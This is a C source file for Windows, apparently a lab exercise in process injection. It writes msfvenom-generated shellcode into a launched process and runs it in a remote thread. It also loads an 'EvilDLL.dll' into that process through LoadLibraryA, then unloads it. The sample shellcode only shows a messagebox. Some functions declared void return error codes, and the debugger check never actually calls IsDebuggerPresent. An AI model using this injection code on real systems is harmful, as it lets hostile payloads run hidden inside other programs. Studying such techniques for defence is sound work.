#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

void codeInject(HANDLE hProcess) {

	// Allocate memory into process
	// kali@kali > msfvenom -a x64 --platform windows -p windows/x64/messagebox TEXT='evil hammie' -f c -v payload
	unsigned char payload[] =
		"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xcc\x00\x00\x00\x41"
		"\x51\x41\x50\x52\x51\x48\x31\xd2\x56\x65\x48\x8b\x52\x60"
		"\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x0f\xb7\x4a\x4a\x4d"
		"\x31\xc9\x48\x8b\x72\x50\x48\x31\xc0\xac\x3c\x61\x7c\x02"
		"\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51"
		"\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18"
		"\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00"
		"\x48\x85\xc0\x74\x67\x48\x01\xd0\x44\x8b\x40\x20\x49\x01"
		"\xd0\x8b\x48\x18\x50\xe3\x56\x4d\x31\xc9\x48\xff\xc9\x41"
		"\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1\xc9\x0d"
		"\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39"
		"\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b"
		"\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41"
		"\x58\x48\x01\xd0\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41"
		"\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
		"\x8b\x12\xe9\x4b\xff\xff\xff\x5d\xe8\x0b\x00\x00\x00\x75"
		"\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00\x59\x41\xba\x4c"
		"\x77\x26\x07\xff\xd5\x49\xc7\xc1\x00\x00\x00\x00\xe8\x0c"
		"\x00\x00\x00\x65\x76\x69\x6c\x20\x68\x61\x6d\x6d\x69\x65"
		"\x00\x5a\xe8\x0b\x00\x00\x00\x4d\x65\x73\x73\x61\x67\x65"
		"\x42\x6f\x78\x00\x41\x58\x48\x31\xc9\x41\xba\x45\x83\x56"
		"\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d"
		"\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75"
		"\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";

	LPVOID lpBase = VirtualAllocEx(hProcess, NULL, sizeof(payload), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	if (lpBase == NULL)
	{
		printf("\nCould not allocate memory into process! Error: %ld\n", GetLastError());
		return 66;
	}
	printf("\nAllocated memory at: 0x%p with size %d\n", lpBase, sizeof(payload));

	// Write payload to process
	if (!WriteProcessMemory(hProcess,
		lpBase,
		payload,
		sizeof(payload),
		NULL))
	{
		printf("\nCould not write buffer! Error: %ld\n", GetLastError());
		return 77;
	}

	// Run the payload inside a new thread
	HANDLE hRemoteThreadID;
	HANDLE hThread = CreateRemoteThreadEx(
		hProcess,
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)lpBase,
		NULL,
		0,
		0,
		&hRemoteThreadID);
	if (hThread == NULL)
	{
		printf("\nCould not create remote thread! Error: %ld\n", GetLastError());
		return 88;
	}

	printf("\nRunning payload inside new thread 0x%x...", hThread);
	WaitForSingleObject(hThread, INFINITE);
	printf("done!\n");
	CloseHandle(hThread);
}


void dllInject(HANDLE hProcess, DWORD pid) {

	const char dllPath[MAX_PATH] = "D:\\Projects\\W32-Test\\x64\\Debug\\EvilDLL.dll";

	LPVOID lpBase = VirtualAllocEx(hProcess, NULL, sizeof(dllPath), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	if (lpBase == NULL)
	{
		printf("\nCould not allocate memory into process! Error: %ld\n", GetLastError());
		return 66;
	}
	printf("\nAllocated memory at: 0x%p with size %d\n", lpBase, sizeof(dllPath));


	// Write dll path to process
	if (!WriteProcessMemory(hProcess,
		lpBase,
		dllPath,
		sizeof(dllPath),
		NULL))
	{
		printf("\nCould not write buffer! Error: %ld\n", GetLastError());
		return 77;
	}
	printf("Wrote DLL path into memory\n\n");


	HMODULE kernel32 = GetModuleHandle("Kernel32.dll");
	if (kernel32 == NULL)
	{
		printf("Could not get Kernel32 handle. Error: %lu", GetLastError());
		return;
	}
	LPVOID lpLoadLibrary = GetProcAddress(kernel32, "LoadLibraryA");
	if (lpLoadLibrary == NULL)
	{
		printf("Could not get LoadLibrary address. Error: %lu", GetLastError());
		return;
	}
	printf("LoadLibraryW in Kernel32.dll is at: 0x%p\n", lpLoadLibrary);

	// Run the payload inside a new thread
	HANDLE hRemoteThreadID;
	HANDLE hThread = CreateRemoteThread(
		hProcess,
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)lpLoadLibrary,
		lpBase,
		0,
		&hRemoteThreadID);
	if (hThread == NULL)
	{
		printf("Could not create remote thread! Error: %ld\n", GetLastError());
		return 88;
	}

	printf("Loading DLL inside new thread 0x%x...", hThread);
	WaitForSingleObject(hThread, INFINITE);
	printf("done!\n\n");

	// Find hModule of injected DLL!
	Sleep(2000); // Delay so we can make snapshot!
	HANDLE ss = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
	if (ss == INVALID_HANDLE_VALUE)
	{
		printf("Could not create snapshot. Error: %lu\n", GetLastError());
		return;
	}

	MODULEENTRY32 me;
	me.dwSize = sizeof(me);
	if (!Module32First(ss, &me))
	{
		printf("Could not find module in snapshot. Error: %lu\n", GetLastError());
		return;
	}

	HMODULE hModule = NULL;
	do {
		if (strstr(dllPath, me.szModule) != NULL) {
			hModule = me.modBaseAddr;
			break;
		}
	} while (Module32Next(ss, &me));
	CloseHandle(ss);
	if (hModule == NULL)
	{
		printf("Could not find injected DLL!\n");
		return;
	}
	printf("Injected DLL was found at: 0x%p\n\n", hModule);


	//Unload DLL!
	LPVOID lpFreeLibrary = GetProcAddress(kernel32, "FreeLibrary");
	if (lpFreeLibrary == NULL)
	{
		printf("Could not get FreeLibrary address. Error: %lu", GetLastError());
		return;
	}
	printf("FreeLibrary in Kernel32.dll is at: 0x%p\n", lpFreeLibrary);

	// Run the FreeLibrary inside a new remote thread
	HANDLE hRemoteUnloadThreadID;
	HANDLE hUnloadThread = CreateRemoteThread(
		hProcess,
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)lpFreeLibrary,
		(LPVOID)hModule,
		0,
		&hRemoteUnloadThreadID);
	if (hUnloadThread == NULL)
	{
		printf("Could not create remote thread! Error: %ld\n", GetLastError());
		return 88;
	}

	printf("Unloading DLL inside new thread 0x%x...", hUnloadThread);
	WaitForSingleObject(hUnloadThread, INFINITE);
	printf("done!\n");


	// Cleanup
	CloseHandle(hThread);
}


int main(int argc, char *argv[])
{
	if (argc != 2)
	{
		printf("Usage: ./process.exe <application_path>\n");
		return EXIT_FAILURE;
	}

	if (IsDebuggerPresent)
	{
		printf("Debugger is here!!!\n");
	}

	// LPSTR lpCommandLine = (char*)"calc.exe";
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	printf("Starting: %s\n", argv[1]);

	if (!CreateProcess(argv[1],
		NULL, //lpCommandLine,
		NULL, 
		NULL, 
		FALSE, 
		0, 
		NULL, 
		NULL, 
		&si, 
		&pi)) 
	{
		printf("Could not create process! Error: %ld\n", GetLastError());
		return -69;
	}
	printf("Process ID: %lu, handle: 0x%x\n", pi.dwProcessId, pi.hProcess);
	printf("Thread ID: %lu, handle: 0x%x\n", pi.dwThreadId, pi.hThread);


	/*
	// Open handle to process
	DWORD pid = pi.dwProcessId;
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProcess == NULL)
	{
		printf("Could not open handle to process!\n");
		return 55;
	}
	printf("Process handle: %p", hProcess);
	*/


	//codeInject(pi.hProcess);
	dllInject(pi.hProcess, pi.dwProcessId);

	// Exit
	printf("\nWaiting for process to close...");
	WaitForSingleObject(pi.hProcess, INFINITE);
	printf("process closed!\n");
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	return EXIT_SUCCESS;
}